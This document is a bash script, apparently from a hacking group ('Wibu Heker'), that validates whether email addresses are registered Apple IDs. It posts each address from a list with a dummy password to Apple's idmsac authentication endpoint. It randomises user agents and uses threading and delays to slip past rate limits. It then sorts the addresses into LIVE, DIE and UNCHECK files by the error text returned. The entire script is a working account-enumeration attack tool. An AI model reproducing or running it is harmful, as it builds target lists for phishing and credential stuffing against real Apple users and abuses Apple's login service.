#!/usr/bin/bash
## Apple Validator

green='\e[92m'
blue='\e[34m'
red='\e[31m'
white='\e[39m'
bold='\e[1m'
yell='\e[33m'

cat <<EOF

APPLE VALID EMAIL

Powered By Wibu Heker

EOF

read -p "[?] Mail List : " l
if [[ ! -f $l ]]; then
    echo "[-] File $l Not Exist"
    exit 1
fi

read -p "[?] Threads : " t

read -p "[?] Delay : " d
total=$[`cat $l | wc -l`+1]
echo -e "${blue}${total}${white} Mail Loaded..."

count=0;
pp=0;
live=0;
die=0;
uncheck=0;
IFS=$'\r\n'
for email in $(cat $l); do
    ((cthread=cthread%t)); ((cthread++==0)) && wait
    if [[ $pp == $d ]]; then
        echo -e "${blue}Delaying for ${d} ...${white}"
        pp=0;
        sleep $d
    fi
    date=$(date '+%H:%M:%S')
    count=$[$count+1]
    pp=$[$pp+1];
    randAgent="Mozilla/${RANDOM:0:1}.${RANDOM:0:1} (Ubuntu ${RANDOM:0:1}.${RANDOM:0:1};en-US;)"
    curl=$(curl -s "https://idmsac.apple.com/authenticate" -X POST -H "User-Agent: ${randAgent}" -d "accountPassword=wibuheker&appleId=${email}&appIdKey=3b356c1bac5ad9735ad62f24d43414eb59715cc4d21b178835626ce0d2daa77d")
    if [[ "$curl" =~ "Access denied. Your account does not have permission to access this application." ]]; then
        live=$[$live+1]
        echo $email >> LIVE.txt
        echo -e "[${date}][${count}/${total}] ${email} | ${bold}${green}LIVE${white}"
    elif [[ "$curl" =~ "Your Apple ID or password was entered incorrectly" ]]; then
        die=$[$die+1]
        echo $email >> DIE.txt
        echo -e "[${date}][${count}/${total}] ${email} | ${bold}${red}DIE${white}"
    else
        uncheck=$[$uncheck+1]
        echo $email >> UNCHECK.txt
        echo -e "[${date}][${count}/${total}] ${email} | ${bold}${yell}UNCHECK${white}"
    fi
done
wait
echo "LIVE: ${live}"
echo "DIE: ${die}"
echo "UNCHECK: ${uncheck}"
